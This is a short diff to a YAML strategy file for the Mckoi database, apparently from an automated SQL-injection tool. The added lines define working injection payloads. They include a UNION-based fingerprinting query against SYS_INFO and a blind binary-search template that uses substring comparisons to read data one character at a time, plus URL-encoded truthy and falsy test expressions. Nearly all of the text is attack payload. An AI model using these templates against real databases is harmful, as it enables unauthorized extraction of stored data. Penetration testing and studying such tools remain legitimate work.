@@ -112,6 +112,33 @@ strategy:
   fingerprint:
    errorMessage:
     - mckoi
+   vendorSpecific: union all select 1 from SYS_INFO.sUSRSchemaInfo where IF(${test},'a','b')='a'
+
+ binary:
+  test:
+   # sub-query not allowed in where, restoring union though counter intuitive with Blind
+   # todo union forced to 1, should find number of index
+   bin: |
+    1=0 and 1=0 union all select rrr 
+    from(select ${injection})
+    where substring(rrr,${window.char},1)%3E%3D'${mid}'
+   truthyBin:
+    - "'a'%3E%3D'a'"
+    - "'a'%3E%3D'A'"
+    - "'a'%3E%3D'0'"
+    - "'b'%3E%3D'a'"
+    - "'b'%3E%3D'B'"
+    - "'1'%3E%3D'0'"
+   falsyBin:
+    - "'a'%3E%3D'b'"
+    - "'A'%3E%3D'a'"
+    - "'B'%3E%3D'b'"
+    - "'B'%3E%3D'a'"
+    - "'0'%3E%3D'A'"
+    - "'0'%3E%3D'1'"
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
 
  union:
   indices: union all select rr from (${indice_unique})b
